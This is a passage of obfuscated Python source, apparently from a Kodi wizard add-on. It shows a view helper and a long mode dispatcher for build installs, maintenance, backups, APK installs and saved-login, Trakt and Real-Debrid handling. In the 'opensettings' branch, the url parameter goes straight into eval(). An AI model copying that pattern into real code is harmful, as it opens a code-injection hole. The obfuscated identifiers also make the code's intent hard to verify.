wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5058
def setView (OO00O0000OO00OOO0 ,OO00OOO00OO00OO00 ):#line:5059
	if wiz .getS ('auto-view')=='true':#line:5060
		O0000O0OOO000OOOO =wiz .getS (OO00OOO00OO00OO00 )#line:5061
		if O0000O0OOO000OOOO =='50'and KODIV >=17 and SKIN =='skin.estuary':O0000O0OOO000OOOO ='55'#line:5062
		if O0000O0OOO000OOOO =='500'and KODIV >=17 and SKIN =='skin.estuary':O0000O0OOO000OOOO ='50'#line:5063
		wiz .ebi ("Container.SetViewMode(%s)"%O0000O0OOO000OOOO )#line:5064
if mode ==None :index ()#line:5066
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5068
elif mode =='builds':buildMenu ()#line:5069
elif mode =='viewbuild':viewBuild (name )#line:5070
elif mode =='buildinfo':buildInfo (name )#line:5071
elif mode =='buildpreview':buildVideo (name )#line:5072
elif mode =='install':buildWizard (name ,url )#line:5073
elif mode =='theme':buildWizard (name ,mode ,url )#line:5074
elif mode =='viewthirdparty':viewThirdList (name )#line:5075
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5076
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5077
elif mode =='maint':maintMenu (name )#line:5079
elif mode =='passpin':passandpin ()#line:5080
elif mode =='backmyupbuild':backmyupbuild ()#line:5081
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5082
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5083
elif mode =='advancedsetting':advancedWindow (name )#line:5084
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5085
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5086
elif mode =='asciicheck':wiz .asciiCheck ()#line:5087
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5088
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5089
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5090
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5091
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5092
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5093
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5094
elif mode =='currentsettings':viewAdvanced ()#line:5095
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5096
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5097
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5098
elif mode =='fixskin':backtokodi ()#line:5099
elif mode =='testcommand':testcommand ()#line:5100
elif mode =='rdon':rdon ()#line:5101
elif mode =='rdoff':rdoff ()#line:5102
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5103
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5104
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5105
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5106
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5107
elif mode =='freshstart':freshStart ()#line:5108
elif mode =='forceupdate':wiz .forceUpdate ()#line:5109
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5110
elif mode =='forceclose':wiz .killxbmc ()#line:5111
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5112
elif mode =='hidepassword':wiz .hidePassword ()#line:5113
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5114
elif mode =='enableaddons':enableAddons ()#line:5115
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5116
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5117
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5118
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5119
elif mode =='uploadlog':uploadLog .Main ()#line:5120
elif mode =='viewlog':LogViewer ()#line:5121
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5122
elif mode =='viewerrorlog':errorChecking (all =True )#line:5123
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5124
elif mode =='purgedb':purgeDb ()#line:5125
elif mode =='fixaddonupdate':fixUpdate ()#line:5126
elif mode =='removeaddons':removeAddonMenu ()#line:5127
elif mode =='removeaddon':removeAddon (name )#line:5128
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5129
elif mode =='removedata':removeAddonData (name )#line:5130
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5131
elif mode =='systeminfo':systemInfo ()#line:5132
elif mode =='restorezip':restoreit ('build')#line:5133
elif mode =='restoregui':restoreit ('gui')#line:5134
elif mode =='restoreaddon':restoreit ('addondata')#line:5135
elif mode =='restoreextzip':restoreextit ('build')#line:5136
elif mode =='restoreextgui':restoreextit ('gui')#line:5137
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5138
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5139
elif mode =='apk':apkMenu (name )#line:5141
elif mode =='apkscrape':apkScraper (name )#line:5142
elif mode =='apkinstall':apkInstaller (name ,url )#line:5143
elif mode =='speed':speedMenu ()#line:5144
elif mode =='net':net_tools ()#line:5145
elif mode =='GetList':GetList (url )#line:5146
elif mode =='youtube':youtubeMenu (name )#line:5147
elif mode =='viewVideo':playVideo (url )#line:5148
elif mode =='addons':addonMenu (name )#line:5150
elif mode =='addoninstall':addonInstaller (name ,url )#line:5151
elif mode =='savedata':saveMenu ()#line:5153
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5154
elif mode =='managedata':manageSaveData (name )#line:5155
elif mode =='whitelist':wiz .whiteList (name )#line:5156
elif mode =='trakt':traktMenu ()#line:5158
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5159
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5160
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5161
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5162
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5163
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5164
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5165
elif mode =='realdebrid':realMenu ()#line:5167
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5168
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5169
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5170
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5171
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5172
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5173
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5174
elif mode =='login':loginMenu ()#line:5176
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5177
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5178
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5179
elif mode =='clearlogin':loginit .clearSaved (name )#line:5180
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5181
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5182
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5183
elif mode =='contact':notify .contact (CONTACT )#line:5185
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5186
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5187
elif mode =='developer':developer ()#line:5189
elif mode =='converttext':wiz .convertText ()#line:5190
elif mode =='createqr':wiz .createQR ()#line:5191
elif mode =='testnotify':testnotify ()#line:5192
elif mode =='testnotify2':testnotify2 ()#line:5193
elif mode =='servicemanual':servicemanual ()#line:5194
elif mode =='fastinstall':fastinstall ()#line:5195
elif mode =='testupdate':testupdate ()#line:5196
elif mode =='testfirst':testfirst ()#line:5197
elif mode =='testfirstrun':testfirstRun ()#line:5198
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5199
elif mode =='bg':wiz .bg_install (name ,url )#line:5201
elif mode =='bgcustom':wiz .bg_custom ()#line:5202
elif mode =='bgremove':wiz .bg_remove ()#line:5203
elif mode =='bgdefault':wiz .bg_default ()#line:5204
elif mode =='rdset':rdsetup ()#line:5205
elif mode =='mor':morsetup ()#line:5206
elif mode =='mor2':morsetup2 ()#line:5207
elif mode =='resolveurl':resolveurlsetup ()#line:5208
elif mode =='urlresolver':urlresolversetup ()#line:5209
elif mode =='forcefastupdate':forcefastupdate ()#line:5210
elif mode =='traktset':traktsetup ()#line:5211
elif mode =='placentaset':placentasetup ()#line:5212
elif mode =='flixnetset':flixnetsetup ()#line:5213
elif mode =='reptiliaset':reptiliasetup ()#line:5214
elif mode =='yodasset':yodasetup ()#line:5215
elif mode =='numbersset':numberssetup ()#line:5216
elif mode =='uranusset':uranussetup ()#line:5217
elif mode =='genesisset':genesissetup ()#line:5218
elif mode =='fastupdate':fastupdate ()#line:5219
elif mode =='folderback':folderback ()#line:5220
elif mode =='menudata':Menu ()#line:5221
elif mode ==2 :#line:5223
        wiz .torent_menu ()#line:5224
elif mode ==3 :#line:5225
        wiz .popcorn_menu ()#line:5226
elif mode ==8 :#line:5227
        wiz .metaliq_fix ()#line:5228
elif mode ==9 :#line:5229
        wiz .quasar_menu ()#line:5230
elif mode ==5 :#line:5231
        swapSkins ('skin.Premium.mod')#line:5232
elif mode ==13 :#line:5233
        wiz .elementum_menu ()#line:5234
elif mode ==16 :#line:5235
        wiz .fix_wizard ()#line:5236
elif mode ==17 :#line:5237
        wiz .last_play ()#line:5238
elif mode ==18 :#line:5239
        wiz .normal_metalliq ()#line:5240
elif mode ==19 :#line:5241
        wiz .fast_metalliq ()#line:5242
elif mode ==20 :#line:5243
        wiz .fix_buffer2 ()#line:5244
elif mode ==21 :#line:5245
        wiz .fix_buffer3 ()#line:5246
elif mode ==11 :#line:5247
        wiz .fix_buffer ()#line:5248
elif mode ==15 :#line:5249
        wiz .fix_font ()#line:5250
elif mode ==14 :#line:5251
        wiz .clean_pass ()#line:5252
elif mode ==22 :#line:5253
        wiz .movie_update ()#line:5254
elif mode =='adv_settings':buffer1 ()#line:5255
elif mode =='getpass':getpass ()#line:5256
elif mode =='setpass':setpass ()#line:5257
elif mode =='setuname':setuname ()#line:5258
elif mode =='passandUsername':passandUsername ()#line:5259
elif mode =='9':disply_hwr ()#line:5260
elif mode =='99':disply_hwr2 ()#line:5261
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))